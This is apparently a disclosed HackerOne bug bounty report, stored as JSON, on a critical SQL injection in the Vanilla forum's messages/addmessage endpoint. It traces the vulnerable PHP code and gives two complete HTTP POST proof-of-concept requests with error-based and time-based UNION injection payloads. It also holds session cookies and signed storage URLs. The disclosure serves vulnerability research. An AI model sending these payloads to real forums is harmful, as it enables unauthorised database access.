@@ -1,0 +1,163 @@
+{
+  "id": 358570,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTg1NzA=",
+  "url": "https://hackerone.com/reports/358570",
+  "title": "A SQL injection vulnerability in Vanilla",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-29T04:27:06.842Z",
+  "submitted_at": "2018-05-29T04:27:06.842Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "balis0ng",
+    "url": "/balis0ng",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-25T02:02:50.168Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-25T02:02:32.091Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nThere is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.\n**Description:**\nin applications/conversations/controllers/class.messagescontroller.php:164\n```php\npublic function addMessage($conversationID = '') {\n        $this->Form->setModel($this->ConversationMessageModel);\n        if (is_numeric($conversationID) && $conversationID > 0) {\n            $this->Form->addHidden('ConversationID', $conversationID);\n        }\n\n        if ($this->Form->authenticatedPostBack()) {\n            $conversationID = $this->Form->getFormValue('ConversationID', '');\n\n            // Make sure the user posting to the conversation is actually\n            // a member of it, or is allowed, like an admin.\n            if (!checkPermission('Garden.Moderation.Manage')) {\n                $userID = Gdn::session()->UserID;\n                $validConversationMember = $this->ConversationModel->validConversationMember($conversationID, $userID);\n                if (!$validConversationMember) {\n                    throw permissionException();\n                }\n            }\n```\nWe noticed that the value of $conversationID is controlled by us.It can be an array.\nThen we saw that $conversationID was brought into the validConversationMember function.Let's follow in this function.\n```php\n    public function validConversationMember($conversationID, $userID) {\n        $conversationMembers = $this->getConversationMembers($conversationID, true, false, false, true);\n        return (in_array($userID, $conversationMembers));\n    }\n```\nOK,It is brought into the getConversationMembers function.go on.\n```php\npublic function getConversationMembers($conversationID, $idsOnly = true, $limit = false, $offset = false, $active = null) {\n        $conversationMembers = [];\n\n        $userConversation = new Gdn_Model('UserConversation');\n        if (is_array($conversationID)) {\n            $where = $conversationID;\n        } else {\n            $where = ['ConversationID' => $conversationID];\n        }\n        if ($active === true) {\n            $where['Deleted'] = 0;\n        } elseif ($active === false) {\n            $where['Deleted'] = 1;\n        }\n        $userMembers = $userConversation->getWhere($where, 'UserID', 'asc', $limit, $offset)->resultArray();\n\n        if (is_array($userMembers) && count($userMembers)) {\n            if ($idsOnly) {\n                $conversationMembers = array_column($userMembers, 'UserID');\n            } else {\n                $conversationMembers = Gdn_DataSet::index($userMembers, 'UserID');\n            }\n        }\n\n        return $conversationMembers;\n    }\n```\nYou can see that when the value of $conversationID is an array, assign $conversationID directly to $where.\nThen $where is brought into the getWhere function.\n```php\n   public function getWhere($where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = false) {\n        $this->_beforeGet();\n        return $this->SQL->getWhere($this->Name, $where, $orderFields, $orderDirection, $limit, $offset);\n    }\n```\n```php\n  public function getWhere($table = '', $where = false, $orderFields = '', $orderDirection = 'asc', $limit = false, $offset = 0) {\n        if ($table != '') {\n            //$this->mapAliases($Table);\n            $this->from($table);\n        }\n\n        if ($where !== false) {\n            $this->where($where);\n        }\n\n        if ($orderFields != '') {\n            $this->orderBy($orderFields, $orderDirection);\n        }\n\n        if ($limit !== false) {\n            $this->limit($limit, $offset);\n        }\n\n        $result = $this->query($this->getSelect());\n\n        return $result;\n    }\n```\nKeep track of $where.\n```php\npublic function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {\n        if (!is_array($field)) {\n            $field = [$field => $value];\n        }\n        foreach ($field as $subField => $subValue) {\n            if (is_array($subValue)) {\n                if (count($subValue) == 1) {\n                    $firstVal = reset($subValue);\n                    $this->where($subField, $firstVal);\n                } else {\n                    $this->whereIn($subField, $subValue);\n                }\n            } else {\n                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);\n                if (strlen($whereExpr) > 0) {\n                    $this->_where($whereExpr);\n                }\n            }\n        }\n        return $this;\n    }\n```\nYeah, you can see we can control the value of the field to cause the injection.\nAs I said in the vulnerability https://hackerone.com/reports/353784.\n## Steps to reproduce:\n\n1.The first step is to enable conversations.\n2.We register and log in to an account\n3.Construct an injection message. The value of TransientKey can be grabbed from a normal POST packet.\nThe attack packet that I constructed based on error injection is as follows:\n```\nPOST /messages/addmessage/ HTTP/1.1\nHost: localhost\nContent-Length: 222\nPragma: no-cache\nCache-Control: no-cache\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://localhost\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://localhost/messages/2\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8\nCookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd\nConnection: close\n\nTransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+or+updatexml(1,concat(0x3e,user()),0)+and+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2\n```\nAs shown in the figure, the database user name is output:\nF302792\nDelayed injection attack message using Union operation is as follows:\n```\nPOST /messages/addmessage/ HTTP/1.1\nHost: localhost\nContent-Length: 275\nPragma: no-cache\nCache-Control: no-cache\nAccept: application/json, text/javascript, */*; q=0.01\nOrigin: http://localhost\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: http://localhost/messages/2\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8\nCookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzAxNTIzMzMsImlhdCI6MTUyNzU2MDMzMywic3ViIjo3fQ.WFdBfYiPUWy_M8N861m3gT1S3LvqpTBfWvqM9WWRUKY; Vanilla-Vv=1527560333; Vanilla-tk=qKz7tUjBiiRQRALz%3A7%3A1527560334%3Aa656c9644245d85d788c83d32d4cc3bd\nConnection: close\n\nTransientKey=qKz7tUjBiiRQRALz&hpt=&ConversationID[1%3d1+and+1%3d1+union+select+1,2,3,4,5,6,7,sleep(5),9+union+select+*+from+GDN_UserConversation+where+1]=2&Format=Markdown&Body=123123&DeliveryType=VIEW&DeliveryMethod=JSON&Send Message=Send Message&BodyLastMessageID=Message_2\n```\nAs shown, delay 5S:\nF302796\nThe complete SQL statement executed in the database is\n**select *\nfrom GDN_UserConversation `UserConversation`\nwhere 1=1 and 1=1 union select 1,2,3,4,5,6,7,sleep(5),9 union select * from GDN_UserConversation where 1 = '2'\n and Deleted = '0'\norder by UserID asc**\n## Anything else we should know?\n\n## Impact\n\nOnly need an ordinary registered member to complete the SQL injection attack, the attacker can manipulate database information through the vulnerability\n\nThe hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**Verified**\nYes\n\n**What exploitation technique did you utilize?**\nUNION Operation\n\n**Please describe the results of your verification attempt.**\nobserved a 5+ second time delay\n\n",
+  "bounty_amount": "600.0",
+  "formatted_bounty": "$600",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 302792,
+      "file_name": "6.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/792/4cfb87469122d4e9969ec4a26917208794852877/6.jpg?response-content-disposition=attachment%3B%20filename%3D%226.jpg%22%3B%20filename%2A%3DUTF-8%27%276.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130453Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0943612b7a6f8296b91f1286c8490dede859d692fa89fa2105b1f72ca152097e",
+      "file_size": 97983,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 302796,
+      "file_name": "7.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/796/ea979add6898abbc22ad85e42ecabc593d806495/7.jpg?response-content-disposition=attachment%3B%20filename%3D%227.jpg%22%3B%20filename%2A%3DUTF-8%27%277.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T130453Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d26eb965c019af1ad15bb8d8442ef4d76fd4d22795f9b09dace374678d3e9127",
+      "file_size": 162856,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-10-25T02:02:32.221Z",
+  "allow_singular_disclosure_after": -167396541.51182586,
+  "singular_disclosure_allowed": true,
+  "vote_count": 51,
+  "voters": [
+    "mr_me",
+    "europa",
+    "bogdantcaciuc",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "psaux",
+    "leetboi",
+    "w2w",
+    "ahiezer",
+    "and 41 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10781,
+      "category": "researcher",
+      "content": "Because the value of conversationID is controlled by the attacker.The attacker can construct an array and perform SQL injection.\nCredit: ADLab of Venustech",
+      "user": {
+        "id": 129870,
+        "username": "balis0ng",
+        "name": "Balis0ng",
+        "bio": "Twitter@Balis0nghack",
+        "cleared": false,
+        "verified": false,
+        "website": "http://balis0ng.com",
+        "location": "",
+        "created_at": "2016-12-10T15:51:19.338Z",
+        "url": "https://hackerone.com/balis0ng",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/129/870/f7fae9533c89d599194353645d3b027d33ad8c77_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
